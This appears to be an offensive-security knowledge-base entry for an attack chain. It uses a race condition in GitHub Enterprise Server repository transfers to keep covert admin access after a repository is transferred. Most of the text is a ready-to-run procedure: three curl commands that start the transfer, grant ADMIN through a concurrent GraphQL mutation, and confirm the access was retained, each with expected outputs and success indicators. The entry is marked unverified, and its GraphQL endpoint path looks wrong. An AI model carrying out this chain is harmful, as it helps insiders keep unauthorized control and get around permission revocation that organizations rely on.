---
tags:
  - race-condition
  - github
  - api-exploit
  - persistence
  - admin-access
type: attack_chain
tools: []
tactics:
  - '[[Persistence]]'
  - '[[Defense Evasion]]'
commands:
  - '[[commands/curl-github-repo-transfer-rest]]'
  - '[[commands/curl-graphql-update-teams-repo]]'
  - '[[commands/curl-check-repo-permissions]]'
verified: false
platforms:
  - Web
  - GitHub Enterprise Server
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Initiate-GitHub-Repository-Transfer-via-REST-API]]'
  - '[[procedures/Exploit-Race-Condition-with-GraphQL-updateTeamsRepository]]'
  - '[[procedures/Verify-Retained-Admin-Access-on-Transferred-Repository]]'
step_count: 3
techniques:
  - '[[Account Manipulation]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:29.342Z'
description: >-
  Exploits a race condition in GitHub Enterprise Server's repository transfer
  process to retain admin permissions covertly after transfer to another
  organization.
skill_level: advanced
impact_level: high
id: 94e865e6-874e-4d07-ad26-79c023f033d7
validated: true
mitre_tactics:
  - '[[Persistence]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Account Manipulation]]'
  - '[[Exploit Public-Facing Application]]'
---
# Race Condition in GitHub Repo Transfer API for Persistent Admin Access Retention

Multi-stage attack chain demonstrating a complete attack workflow exploiting a race condition in GitHub Enterprise Server versions 3.8.0 and above. An existing administrator initiates a repository transfer while simultaneously modifying team permissions via GraphQL, retaining covert admin access post-transfer.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~2 minutes |
| Skill Level | Advanced |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initiate Repo Transfer] --> B[Update Permissions During Transfer]
    B --> C[Verify Retained Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- curl (for API requests)
- GitHub Personal Access Token with admin scopes

### Target Environment

- GitHub Enterprise Server 3.8.0+
- Required services: Repositories, Teams, REST API, GraphQL API
- Network access: Internal network to GHE instance

### Initial Access Requirements

- Existing admin credentials on the source organization
- Repository ownership in source org
- Target organization for transfer

## Detailed Attack Procedures

### Step 1: Initiate Repository Transfer
procedure: [[procedures/Initiate-GitHub-Repository-Transfer-via-REST-API]]

**Objective**: Start the repository transfer process via REST API, creating a brief window for the race condition.

**Instructions**: Use [[commands/curl-github-repo-transfer-rest]] to initiate the transfer:

```bash
curl -X POST \
  -H "Authorization: token YOUR_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://ghe.example.com/api/v3/repos/OWNER/REPO/transfer \
  -d '{"new_owner": "target-org"}'
```

**Expected Output**: JSON response indicating transfer initiation, e.g., {"message": "Transfer started"}.

**Success Indicators**:
- Transfer process begins without immediate permission revocation
- No errors in API response

### Step 2: Exploit Race Condition with Permission Update
procedure: [[procedures/Exploit-Race-Condition-with-GraphQL-updateTeamsRepository]]

**Objective**: During the transfer window, modify team permissions via GraphQL to retain admin access.

**Instructions**: Concurrently execute [[commands/curl-graphql-update-teams-repo]] to update permissions:

```bash
curl -X POST \
  -H "Authorization: token YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  https://ghe.example.com/api/v3/graphql \
  -d '{"query": "mutation { updateTeamRepository(teamId: \"TEAM_ID\" ,ownerId: \"TARGET_ORG\", repositoryId: \"REPO_ID\", permission: ADMIN) { repository { id } } }"}'
```

**Expected Output**: GraphQL response confirming permission update, e.g., {"data": {"updateTeamRepository": {"repository": {"id": "REPO_ID"}}}}.

**Success Indicators**:
- Mutation succeeds without conflict
- Permissions altered during transfer

### Step 3: Verify Retained Access
procedure: [[procedures/Verify-Retained-Admin-Access-on-Transferred-Repository]]

**Objective**: Confirm persistent admin access post-transfer.

**Instructions**: Check permissions using [[commands/curl-check-repo-permissions]]:

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://ghe.example.com/api/v3/repos/target-org/REPO/collaborators/USERNAME/permission
```

**Expected Output**: JSON showing "admin" permission, e.g., {"permission": "admin"}.

**Success Indicators**:
- Original admin retains full access
- No revocation observed

## Attack Chain Summary

### Key Achievements

1. Covert retention of admin permissions during repo transfer
2. Bypassing expected permission revocation
3. Persistent unauthorized control over transferred repository

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Manipulation]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Persistence]]
- [[Defense Evasion]]

---
*Last updated: 2023-10-01T00:00:00Z*
